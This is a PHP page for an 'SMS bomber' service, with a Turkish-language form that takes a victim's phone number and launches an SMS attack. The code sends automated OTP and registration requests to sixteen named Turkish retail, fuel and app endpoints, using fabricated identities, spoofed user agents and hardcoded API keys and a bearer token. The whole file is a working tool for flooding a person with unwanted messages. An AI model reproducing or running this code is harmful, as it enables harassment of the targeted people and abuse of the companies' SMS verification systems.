<?php

$customCSS = array('<link href="../assets/plugins/DataTables/datatables.min.css" rel="stylesheet">');
$customJAVA = array(
    '<script src="../assets/plugins/DataTables/datatables.min.js"></script>',
    '<script src="../assets/plugins/printer/main.js"></script>',
    '<script src="../assets/js/pages/datatables.js"></script>',
    '<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.3.0/dist/sweetalert2.all.min.js"></script>'
);

$page_title = 'SMS Bomber';
include('inc/header_main.php');
include('inc/header_sidebar.php');
include('inc/header_native.php');
?>
<div class="row">
    <div class="col-xl-12 col-md-6">
        <div class="col-lg-12">
            <div class="card">
                <div class="card-body">
                    <h4 class="card-title mb-4"><img style="width: 30px;height: auto;" src="/assets/img/turkey.png" alt=""> SMS Bomber</h4>
                    <p class="mb-1">
                    <p>
                        Telefon numarasına sms saldırısı yapmak için telefon numarası giriniz.</br>
                    </p>
                    </p>
                    <div class="block-content tab-content">
                        <form action="sms" method="POST">
                            <div class="tab-pane active" id="tc" role="tabpanel">
                                <input class="form-control" type="text" name="gsmno" autocomplete="off" id="gsmno" minlength="10" maxlength="10" placeholder="5327151653" required><br>
                            </div>

                            <button onclick="checkNumber2()" id="sorgula" name="Sorgula" type="submit" class="btn waves-effect waves-light btn-rounded btn-outline-primary" style="width: 180px; height: 45px; outline: none;"> Saldırıyı Başlat</button>
                        </form>
                        <div class="table-responsive">
                            <table id="01000001" class="table table-hover" style="width:100%">
                                <thead>
                                    <tr>
                                        <th>Telefon Numarası</th>
                                        <th>Sonuç</th>
                                    </tr>
                                </thead>
                                <tbody id="00001010">
                                    <?php

                                    if (isset($_POST['Sorgula'])) {  
									
									echo "<script>toastr.success('Sorgu başarıyla tamamlandı!');</script>";

                                    $no = htmlspecialchars(strip_tags($_POST['gsmno']));
										
									if ($no == "5532631238") // anasını sikmek serbest
									{
										exit("bu numaraya sms bombası atamazsınız");
									}

                                        function Migros($no)
                                        {
                                            $url = 'https://rest.migros.com.tr:443/sanalmarket/users/login/otp';
                                            $data = array("phoneNumber" => "$no");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function Sakasu($no)
                                        {
                                            $url = 'https://mobilcrm2.saka.com.tr:443/api/customer/login';
                                            $data = array("gsm" => "$no");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function Koctas($no)
                                        {
                                            $ch = curl_init();
                                            curl_setopt($ch, CURLOPT_URL, "https://occ2.koctas.com.tr:443/koctaswebservices/v2/koctas/registerParo/get-register-parocard-otp");
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt(
                                                $ch,
                                                CURLOPT_POSTFIELDS,
                                                "givePermission=true&mobileNumber=$no"
                                            );
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                            $server_output = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function A101($no)
                                        {
                                            $ch = curl_init();
                                            curl_setopt($ch, CURLOPT_URL, "https://www.a101.com.tr:443/users/otp-login/");
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            curl_setopt(
                                                $ch,
                                                CURLOPT_POSTFIELDS,
                                                "phone=0$no&next=/a101-kapida"
                                            );
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                            $server_output = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function KahveDunyasi($no)
                                        {
                                            $ch = curl_init();
                                            curl_setopt($ch, CURLOPT_URL, "https://core.kahvedunyasi.com/api/users/sms/send");
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            curl_setopt(
                                                $ch,
                                                CURLOPT_POSTFIELDS,
                                                "mobile_number=$no&token_type=register_token"
                                            );
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                            $server_output = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function IPApp($no)
                                        {
                                            $url = 'https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp';
                                            $data = array("birthDate" => "31/08/1975", "carPlate" => "31 ABC 31", "name" => "Memati Bas", "otp" => "", "phoneNumber" => $no, "playerId" => "");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function NaosStars($no)
                                        {
                                            $salt = md5(rand(1, 9));
                                            $result = substr($salt, 1, 10);
                                            $email = $result . "@gmail.com";
                                            $ch = curl_init();
                                            curl_setopt($ch, CURLOPT_URL, "https://shop.naosstars.com/users/register/");
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            curl_setopt(
                                                $ch,
                                                CURLOPT_POSTFIELDS,
                                                "email=$email&first_name=Memati&last_name=Bas&password=31ABC..abc31&date_of_birth=1975-12-31&phone=0$no&gender=male&kvkk=true&contact=true&confirm=true"
                                            );
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                            $server_output = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function Aygaz($no)
                                        {
                                            $salt = md5(rand(1, 9));
                                            $result = substr($salt, 1, 10);
                                            $email = $result . "@gmail.com";
                                            $url = 'https://mogazmobilapinew.aygaz.com.tr:443/api/Member/UserRegister';
                                            $data = array("address" => "", "birthDate" => "31-08-1975", "city" => 0, "deviceCode" => "839C5FAF-A7C1-2CDA--6F5414AD2228", "district" => 0, "email" => $email, "isUserAgreement" => True, "name" => "Memati", "password" => "", "phone" => $no, "productType" => 1, "subscription" => True, "surname" => "Bas");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function KimGb($no)
                                        {
                                            $url = 'https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp';
                                            $data = array("msisdn" => "90$no");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function EnglishHome($no)
                                        {
                                            $salt = md5(rand(1, 9));
                                            $result = substr($salt, 1, 10);
                                            $email = $result . "@gmail.com";
                                            $ch = curl_init();
                                            curl_setopt($ch, CURLOPT_URL, "https://www.englishhome.com:443/enh_app/users/registration/");
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            curl_setopt(
                                                $ch,
                                                CURLOPT_POSTFIELDS,
                                                "first_name=Memati&last_name=Bas&email=$email&phone=0$no&password=31ABC..abc31&email_allowed=true&sms_allowed=true&confirm=true&tom_pay_allowed=true"
                                            );
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                                            $server_output = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function Uludag($no)
                                        {
                                            file_get_contents("https://bilet.balikesiruludag.com.tr:443/mobil/UyeOlKontrol.php?CepTelefon=$no");
                                        }

                                        function Pisir($no)
                                        {
                                            $salt = md5(rand(1, 9));
                                            $result = substr($salt, 1, 10);
                                            $email = $result . "@gmail.com";
                                            $url = 'https://api.pisir.com:443/v1/login/';
                                            $data = array("app_build" => "343", "app_platform" => "ios", "msisdn" => "$no");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }


                                        function Defacto($no)
                                        {
                                            $url = 'https://www.defacto.com.tr:443/Customer/SendPhoneConfirmationSms';
                                            $data = array("mobilePhone" => "$no");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function Opet($no)
                                        {
                                            $salt = md5(rand(1, 9));
                                            $result = substr($salt, 1, 10);
                                            $email = $result . "@gmail.com";
                                            $url = 'https://api.opet.com.tr:443/api/authentication/register';
                                            $data = array("abroadcompanies" => ["1", "2", "3"], "birthdate" => "1975-08-31T22:00:00.000Z", "cardNo" => null, "commencisRadio" => "true", "email" => $email, "firstName" => "Memati", "googleRadio" => "true", "lastName" => "Bas", "microsoftRadio" => "true", "mobilePhone" => $no, "opetKvkkAndEtk" => true, "plate" => "31ABC31");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
                                            curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0");
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }


                                        function N11($no)
                                        {
                                            $salt = md5(rand(1, 9));
                                            $result = substr($salt, 1, 10);
                                            $email = $result . "@gmail.com";
                                            $headr = array();
                                            $headr[] = 'Mobileclient: IOS';
                                            $headr[] = 'Content-Type: application/json';
                                            $headr[] = 'Accept: */*';
                                            $headr[] = 'Authorization: api_key=iphone,api_hash=9f55d44e2aa28322cf84b5816bb20461,api_random=686A1491-041F-4138-865F-9E76BC60367F';
                                            $headr[] = 'Clientversion: 163';
                                            $headr[] = 'Accept-Encoding: gzip, deflate';
                                            $headr[] = 'User-Agent: n11/1 CFNetwork/1335.0.3 Darwin/21.6.0';
                                            $headr[] = 'Accept-Language: tr-TR,tr;q=0.9';
                                            $headr[] = 'Connection: close';
                                            $url = 'https://mobileapi.n11.com:443/mobileapi/rest/v2/msisdn-verification/init-verification?__hapc=F41A0C01-D102-4DBE-97B2-07BCE2317CD3';
                                            $data = array("__hapc" => "", "_deviceId" => "696B171-031N-4131-315F-9A76BF60368F", "channel" => "MOBILE_IOS", "countryCode" => "+90", "email" => $email, "gsmNumber" => $no, "userType" => "BUYER");
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, $headr);
                                            curl_setopt($ch, CURLOPT_USERAGENT, "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0");
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }


                                        function PinarSu($no)
                                        {
                                            $headr = array();
                                            $headr[] = 'Devicetype: ios';
                                            $headr[] = 'Content-Type: application/json';
                                            $headr[] = 'Accept: */*';
                                            $headr[] = 'Authorization: bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJJZCI6ImMyZGFiNzVmLTUxNTUtNGQ4NS1iZjkxLWNkYjQxOTkwMTRiZCIsImlzcyI6Imh0dHA6Ly9sb2NhbGhvc3QvIiwiYXVkIjoiaHR0cDovL2xvY2FsaG9zdC8iLCJpYXQiOjE2NzEyODI2NDcsImV4cCI6MTY4MTY1MDY0N30.WkjMSCamAiYXbanSHYE6LxzII-BjZRtjdyYKMcToWHg';
                                            $headr[] = 'Clientversion: 163';
                                            $headr[] = 'Accept-Encoding: gzip, deflate';
                                            $headr[] = 'Level: 40202';
                                            $headr[] = 'Accept-Language: tr-TR,tr;q=0.9';
                                            $headr[] = 'Accountid: 062511D3-BF52-4441-A29B-8250E3900931';
                                            $headr[] = 'User-Agent: Yasam Pinarim/4.2.2 (com.pinarsu.PinarSu; build:11; iOS 15.6.1) Alamofire/4.2.2';
                                            $headr[] = 'Languageid: D4FF115D-1AB5-4141-8719-A102C3CF9F1E';
                                            $headr[] = 'Connection: close';
                                            $url = 'https://pinarsumobileservice.yasar.com.tr:443/pinarsu-mobil/api/Customer/SendOtp';
                                            $data = array("MobilePhone" => $no);
                                            $postdata = json_encode($data);
                                            $ch = curl_init($url);
                                            curl_setopt($ch, CURLOPT_POST, 1);
                                            curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
                                            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                            curl_setopt($ch, CURLOPT_HTTPHEADER, $headr);
                                            curl_setopt($ch, CURLOPT_USERAGENT, "n11/1 CFNetwork/1335.0.3 Darwin/21.6.0");
                                            $result = curl_exec($ch);
                                            curl_close($ch);
                                        }

                                        function StartSex($no)
                                        {
                                            Migros($no);
                                            Sakasu($no);
                                            Koctas($no);
                                            A101($no);
                                            KahveDunyasi($no);
                                            IPApp($no);
                                            NaosStars($no);
                                            Aygaz($no);
                                            KimGb($no);
                                            EnglishHome($no);
                                            Uludag($no);
                                            Pisir($no); 
                                            Defacto($no);
                                            Opet($no);
                                            N11($no);
                                            PinarSu($no);
                                        }

                                        if ($no != "" && strlen($no) == 10) {
                                            StartSex($no);
                                            $Response = "Gönderildi";
                                        } else {
                                            $Response = "Hata Oluştu";
                                        }

                                    ?>
                                        <tr>
                                            <th><?= $no; ?></th>
                                            <th><?= $Response; ?></th>
                                        </tr>
                                    <?php
                                    }
                                    ?>
                                </tbody>
                            </table>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
<?php
include('inc/footer_main.php');
?>